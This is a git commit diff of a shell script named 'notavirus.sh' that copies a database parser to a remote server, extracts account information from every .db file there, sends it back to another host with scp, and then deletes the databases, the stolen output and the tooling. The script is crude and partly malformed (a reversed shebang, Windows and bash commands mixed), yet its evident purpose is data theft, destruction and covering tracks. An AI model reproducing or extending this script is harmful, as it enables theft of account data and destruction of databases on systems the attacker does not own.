0bded24e86fcbd139c5ede51718fcbcb00bbcaba
Maya <77994029+mayasavino@users.noreply.github.com>
2023-12-04 20:47:26 -0700

    Update notavirus.sh
    specialize

--- notavirus.sh
+++ notavirus.sh
@@ -1,9 +1,17 @@
 !# /usr/bin/bash
 
-tar.exe -a -c -f present.zip notavirus.sh db_parse.py
+# bring present to db
+tar.exe -a -c -f present.zip db_parse.py
 scp C:\Users\Jerry\Downloads\present.zip administrator@12.34.56.70:/home/administrator
 ssh administrator@12.34.56.70
 
+# unwrap present
+unzip -q present.zip
+cd present
+mv db_parse.py ..
+cd ..
+
+# get data and encrypt db
 for a in $(ls *.db)
 do
     echo Selecting $a
@@ -11,12 +19,17 @@ do
     python3 db_parse.py $a
     echo Done.
     echo Copying info back ...
-    scp account_info.txt
+    scp account_info.txt Jerry@12.34.56.71:C:\Users\Jerry\Downloads\
     echo Done.
-    echo Cleaning up ...
-    rm -f $a
-    rm -f account_info.txt
-    rm -f db_parse.py
-    rm -f notavirus.sh
     echo Finished.
 done
+
+# clean up
+echo Cleaning up ...
+rm -f present.zip
+rm -rf present
+rm -f $a
+rm -f account_info.txt
+rm -f db_parse.py
+
+exit
